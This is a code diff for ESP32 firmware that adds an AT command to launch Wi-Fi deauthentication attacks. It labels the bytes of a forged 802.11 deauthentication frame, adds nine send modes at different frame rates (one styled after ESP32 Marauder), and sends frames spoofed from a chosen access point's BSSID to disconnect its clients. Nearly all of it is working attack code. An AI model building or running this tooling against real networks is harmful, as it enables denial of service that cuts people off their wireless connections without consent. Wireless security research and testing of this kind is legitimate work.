@@ -7,18 +7,22 @@
 
 
 #define DEAUTH_WIFI_MODE 2
+#define NUM_ENABLE_MODES 9
+#define USE_FRAME_MODE_SIGNATURE true
 
 static const char *TAG = "deauth";
 
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
-//TODO: label these bytes
+
 static uint8_t deauth_frame_default[26] = {
-                            0xc0, 0x00, 0x3a, 0x01,
-                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // MAC
+                            0xc0, 0x00,                             // 0xc000 = Deauthentication frame
+                            0x3a, 0x01,                             // 0x3a01 = Duration (314 microseconds)
+                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Dest MAC
+                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Src MAC (same as BSSID for deauth)
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID
-                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID
-                            0xf0, 0xff, 0x02, 0x00
+                            0xf0, 0xff,                             // 0x0fff = sequence number (0xfff = 4096), fragment number (0)
+                            0x02, 0x00                              // 0x0002 = Reason code: Previous authentication no longer valid
                         };
 
 static uint8_t deauth_frame_src[26] = {0};
@@ -28,6 +32,7 @@ static int                  s_frames_sent = 0;
 static TaskHandle_t         s_deauth_task = NULL;
 static bool                 s_deauth_active = false;
 static uint8_t              s_channel = 0;
+static uint16_t             s_enable_mode = 0;
 
 
 /**
@@ -45,16 +50,93 @@ static void deauth_task(void *arg)
 {
     int i = 0;
 
+    // Update NUM_ENABLE_MODES if new modes are added/removed
     while (s_deauth_active) {
-        for (i = 0; i < 3; i++) {
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
-            vTaskDelay(5);
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_dest, sizeof(deauth_frame_dest), false);
-			vTaskDelay(5);
-            s_frames_sent = s_frames_sent + 2;
-        }
+        switch (s_enable_mode)
+		{
+        // frame loop @ 46 frames a second (actual 18 to 20 frames/sec)
+        case 2:
+            for (i = 0; i < 3; i++) {
+                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+                vTaskDelay(5);
+                s_frames_sent = s_frames_sent + 1;
+            }
+            vTaskDelay(50);
+            break;
 
-        vTaskDelay(50);
+
+        // frame loop @ 26 frames a second (actual 18 to 20 frames/sec)
+        case 3:
+            for (i = 0; i < 3; i++) {
+                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+                vTaskDelay(5);
+                s_frames_sent = s_frames_sent + 1;
+            }
+            vTaskDelay(100);
+            break;
+
+        // frame loop @ 11 frames a second
+        case 4:
+            for (i = 0; i < 3; i++) {
+                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+                vTaskDelay(5);
+                s_frames_sent = s_frames_sent + 1;
+            }
+            vTaskDelay(250);
+            break;
+
+        // single frame @ 50 frames a second (actual 18 to 20 frames/sec)
+		case 5:
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+            s_frames_sent = s_frames_sent + 1;
+            vTaskDelay(50);
+            break;
+
+        // single frame @ 10 frames a second
+		case 6:
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+            s_frames_sent = s_frames_sent + 1;
+            vTaskDelay(100);
+            break;
+
+        // single frame @ 4 frames a second
+		case 7:
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+            s_frames_sent = s_frames_sent + 1;
+            vTaskDelay(250);
+            break;
+
+        // single frame @ 2 frames a second
+		case 8:
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+            s_frames_sent = s_frames_sent + 1;
+            vTaskDelay(500);
+            break;
+
+        // ESP32 Marauder style
+		case 9:
+            for (i = 0; i < 3; i++) {
+                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+                vTaskDelay(5);
+                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_dest, sizeof(deauth_frame_dest), false);
+                vTaskDelay(5);
+                s_frames_sent = s_frames_sent + 2;
+            }
+            vTaskDelay(50);
+            break;
+
+        // Default loop mode @ 18 deauth frames a second
+        case 1:
+		default:
+            for (i = 0; i < 3; i++) {
+                esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_src, sizeof(deauth_frame_src), false);
+                vTaskDelay(5);
+                s_frames_sent = s_frames_sent + 1;
+            }
+            vTaskDelay(150);
+            break;
+
+        }
     }
 
     static uint8_t buffer[64] = {0};
@@ -89,7 +171,7 @@ static void construct_deauth_frames(uint8_t *mac, uint8_t *bssid) {
     deauth_frame_src[20] = bssid[4];
     deauth_frame_src[21] = bssid[5];
 
-    // Build AP dest packet
+    // Build AP dest packet (ESP32 Marauder)
     memcpy(deauth_frame_dest, deauth_frame_default, sizeof(deauth_frame_default));
     deauth_frame_dest[4] = bssid[0];
     deauth_frame_dest[5] = bssid[1];
@@ -111,13 +193,21 @@ static void construct_deauth_frames(uint8_t *mac, uint8_t *bssid) {
     deauth_frame_dest[19] = mac[3];
     deauth_frame_dest[20] = mac[4];
     deauth_frame_dest[21] = mac[5];
+
+    if (USE_FRAME_MODE_SIGNATURE) {
+        // Apply mode signature to frame. Overwrite least significant bits in sequence number
+        deauth_frame_src[22] = s_enable_mode << 4;
+        deauth_frame_dest[22] = s_enable_mode << 4;
+
+        ESP_LOGI(TAG, "applying sequence signature for mode %u = 0x%x", s_enable_mode, deauth_frame_src[22]);
+    }
 }
 
 /* AT+DEAUTH? — query status */
 static uint8_t at_query_cmd_deauth(uint8_t *cmd_name)
 {
     static uint8_t buffer[64] = {0};
-    snprintf((char *)buffer, 64, "+DEAUTH:(%d,%u)\r\n", s_deauth_active ? 1 : 0, s_channel);
+    snprintf((char *)buffer, 64, "+DEAUTH:(%d,%u,%u,%u)\r\n", s_deauth_active ? 1 : 0, s_channel, s_enable_mode, NUM_ENABLE_MODES);
     esp_at_port_write_data(buffer, strlen((char *)buffer));
 
     return ESP_AT_RESULT_CODE_OK;
@@ -131,7 +221,13 @@ static uint8_t at_setup_cmd_deauth(uint8_t para_num)
         return ESP_AT_RESULT_CODE_ERROR;
     }
 
-    if (enable == 0) {
+    s_enable_mode = (uint16_t)enable;
+    if (s_enable_mode > NUM_ENABLE_MODES) {
+        s_enable_mode = 1;
+        ESP_LOGW(TAG, "invalid enable mode, defaulting to mode 1");
+    }
+
+    if (s_enable_mode == 0) {
         /* === STOP deauth === */
         if (!s_deauth_active) {
             return ESP_AT_RESULT_CODE_OK;  /* already stopped */
@@ -184,6 +280,10 @@ static uint8_t at_setup_cmd_deauth(uint8_t para_num)
             construct_deauth_frames(mac, bssid);
             return ESP_AT_RESULT_CODE_OK;
         }
+
+        //esp_wifi_set_storage(WIFI_STORAGE_RAM);
+        esp_wifi_start();
+        vTaskDelay(pdMS_TO_TICKS(50));
 
         s_channel = channel;
         esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
